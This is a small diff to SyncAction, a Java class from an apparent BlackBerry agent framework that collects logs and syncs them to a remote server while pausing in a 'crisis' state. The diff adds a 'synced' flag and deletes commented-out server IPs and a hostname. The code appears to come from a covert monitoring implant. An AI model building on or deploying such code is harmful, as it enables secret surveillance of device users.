@@ -14,6 +14,7 @@ import java.util.Vector;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.AgentManager;
 import blackberry.Conf;
+import blackberry.Status;
 import blackberry.agent.Agent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -106,8 +107,13 @@ public class SyncAction extends SubAction {
         }
 
         try {
+        	if(status.synced == true){
+        		//#ifdef DEBUG
+                debug.warn("Already synced in this action: skipping");
+                //#endif
+        	}
 
-            if (statusObj.crisis()) {
+            if (status.crisis()) {
                 //#ifdef DEBUG
                 debug.warn("SyncAction - no sync, we are in crisis");
                 //#endif
@@ -120,10 +126,6 @@ public class SyncAction extends SubAction {
             //#ifdef DBC
             Check.asserts(logCollector != null, "logCollector == null");
             //#endif
-
-            //host = "192.168.1.177";
-            //host = "89.96.137.6";
-            //host = "iperbole.suppose.it"; port = 8080;
 
             transferInit();
 
@@ -148,6 +150,8 @@ public class SyncAction extends SubAction {
                 //#ifdef DEBUG_INFO
                 debug.info("SyncAction OK");
                 //#endif
+                
+                status.synced = true;
                 return true;
             }
 
